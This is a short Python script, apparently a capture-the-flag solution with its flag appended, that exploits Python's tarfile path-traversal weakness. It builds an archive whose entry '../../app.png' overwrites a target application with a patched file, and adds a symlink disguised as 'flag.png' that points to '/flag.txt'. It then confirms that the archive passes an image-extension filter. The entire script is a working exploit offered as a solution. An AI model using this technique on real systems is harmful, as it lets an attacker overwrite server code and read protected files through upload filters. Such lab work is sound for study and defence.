# https://davidhamann.de/2022/09/23/python-tarfile-vulnerability/
# https://mail.python.org/pipermail/python-dev/2007-August/074290.html

import tarfile
import os

ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif"}

def has_only_images_in_tar(tar_path):
    try:
        with tarfile.open(tar_path, "r") as tar_ref:
            for member in tar_ref.getmembers():
                _, ext = os.path.splitext(member.name)
                if ext.lower() not in ALLOWED_EXTENSIONS:
                    print(f"Non-image file found in tar: {member.name} - {ext}")
                    return False
                print(f"Image file found in tar: {member.name} - {ext}")
        return True
    except Exception:
        return False

def main():
    if os.path.exists("flag_symlink.png"):
        os.remove("flag_symlink.png")
    try:
        os.symlink("/flag.txt", "flag_symlink.png")
    except FileExistsError:
        pass

    with tarfile.open("album.tar", "w:xz") as tar:
        tar.add("patched_app.py", arcname="../../app.png")
        tar.add("flag_symlink.png", arcname="flag.png")
    
    # Check if the tar file contains only images
    if has_only_images_in_tar("album.tar"):
        print("The tar file contains only images.")
    else:
        print("The tar file contains non-image files.")

if __name__ == "__main__":
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    main()

# DDC{f4k3_im4g3_r34l_fl4g}